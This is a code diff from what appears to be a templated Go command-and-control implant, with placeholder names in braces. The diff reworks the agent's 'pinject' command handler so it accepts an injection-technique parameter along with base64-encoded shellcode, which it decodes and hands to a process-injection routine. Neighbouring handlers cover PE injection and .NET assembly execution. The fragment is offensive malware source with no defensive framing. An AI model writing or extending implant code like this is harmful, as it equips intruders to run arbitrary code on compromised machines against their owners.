@@ -23,13 +23,30 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_PROCESS_COMMAND_FUNC}(command string) strin
         result := a.{AGENT_HANDLE_DOTNET_ASSEMBLY_FUNC}(command)
         return result
     } else if strings.HasPrefix(command, "pinject ") {
-        // Handle shellcode injection command
-        encodedShellcode := command[8:] // Remove "pinject " prefix
+        // Handle shellcode injection command - can include technique parameter
+        remainingCommand := command[8:] // Remove "pinject " prefix
+
+        // Check if there's a technique specified
+        parts := strings.SplitN(remainingCommand, " ", 2)
+        var encodedShellcode string
+        var technique string
+
+        if len(parts) == 2 {
+            // Technique specified: "technique encoded_shellcode"
+            technique = strings.ToLower(parts[0])
+            encodedShellcode = parts[1]
+        } else {
+            // No technique specified, use auto: "encoded_shellcode"
+            technique = "auto"
+            encodedShellcode = parts[0]
+        }
+
         shellcodeData, err := base64.StdEncoding.DecodeString(encodedShellcode)
         if err != nil {
             return fmt.Sprintf("[ERROR] Invalid shellcode data format: %v", err)
         }
-        result := a.{AGENT_INJECT_SHELLCODE_FUNC}(shellcodeData)
+
+        result := a.{AGENT_INJECT_SHELLCODE_FUNC}_with_technique(shellcodeData, technique)
         return result
     } else if strings.HasPrefix(command, "peinject ") {
         // Handle PE injection command - base64 content follows directly after "peinject "
